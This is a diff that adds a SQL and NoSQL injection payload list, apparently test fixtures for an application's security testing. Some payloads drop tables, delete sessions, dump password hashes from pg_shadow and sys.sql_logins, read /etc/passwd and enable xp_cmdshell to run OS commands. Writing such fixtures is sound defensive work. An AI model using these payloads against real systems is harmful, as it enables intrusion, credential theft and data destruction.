@@ -1,0 +1,90 @@
+# SQL Injection Payloads - InsightFlow Security Test Fixtures
+# Format: one payload per line, # for comments
+
+# Basic SQL injection
+' OR 1=1 --
+' OR '1'='1
+' OR 1=1; --
+' OR '1'='1' --
+
+# Admin login bypass
+admin' --
+admin' #
+admin'--
+' OR 1=1 --
+' OR '1'='1' --
+' OR 1=1;#
+admin' OR '1'='1
+admin' OR 1=1--
+
+# Union-based injection
+' UNION SELECT NULL --
+' UNION SELECT NULL,NULL --
+' UNION SELECT NULL,NULL,NULL --
+' UNION SELECT username,password FROM users --
+' UNION SELECT * FROM information_schema.tables --
+' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
+' UNION SELECT 1,@@version,3 --
+' UNION ALL SELECT NULL,NULL,NULL --
+
+# Blind SQL injection
+' AND 1=1 --
+' AND 1=2 --
+' AND SLEEP(5) --
+' AND BENCHMARK(5000000,MD5('test')) --
+' AND (SELECT * FROM users WHERE user_id=1)=1 --
+' OR IF(1=1,SLEEP(5),0) --
+' OR pg_sleep(5) --
+' WAITFOR DELAY '0:0:5' --
+
+# Stacked queries
+'; DROP TABLE users; --
+'; DELETE FROM sessions; --
+'; INSERT INTO users VALUES('hacker','password'); --
+'; UPDATE users SET role='admin' WHERE user_id=1; --
+'; CREATE TABLE hack(data TEXT); --
+'; EXEC xp_cmdshell('dir'); --
+
+# Error-based injection
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --
+' AND UPDATEXML(1,CONCAT(0x7e,(SELECT @@version)),1) --
+' OR 1 GROUP BY 1,2,3 HAVING 1=1 --
+' AND 1=CONVERT(int,(SELECT @@version)) --
+
+# Time-based injection (PostgreSQL)
+' OR (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
+' OR (SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END) --
+' ; SELECT pg_sleep(5) --
+
+# PostgreSQL-specific
+' OR current_setting('password') IS NOT NULL OR '1'='1
+' ; SELECT * FROM pg_stat_activity --
+' UNION SELECT datname,0,0 FROM pg_database --
+' UNION SELECT usename,passwd,0 FROM pg_shadow --
+' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
+
+# MySQL-specific
+' UNION SELECT @@datadir,@@hostname,@@version --
+' UNION SELECT load_file('/etc/passwd'),NULL,NULL --
+' INTO OUTFILE '/tmp/evil.txt' FIELDS TERMINATED BY ',' --
+
+# MSSQL-specific
+' UNION SELECT @@SERVERNAME,@@VERSION,DB_NAME() --
+' ; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; --
+' ; EXEC xp_cmdshell 'whoami' --
+' UNION SELECT name,master.dbo.fn_varbintohexstr(password_hash),NULL FROM sys.sql_logins --
+
+# SQLite-specific
+' UNION SELECT sql FROM sqlite_master --
+' UNION SELECT sql FROM sqlite_master WHERE type='table' --
+' UNION SELECT group_concat(name) FROM sqlite_master --
+
+# NoSQL injection (MongoDB)
+' || '1'=='1
+' || 1==1
+' && this.password.match(/.*/) --
+{"$ne": null}
+{"$gt": ""}
+{"$regex": ".*"}
+{"$where": "1==1"}
+admin' || 1==1//
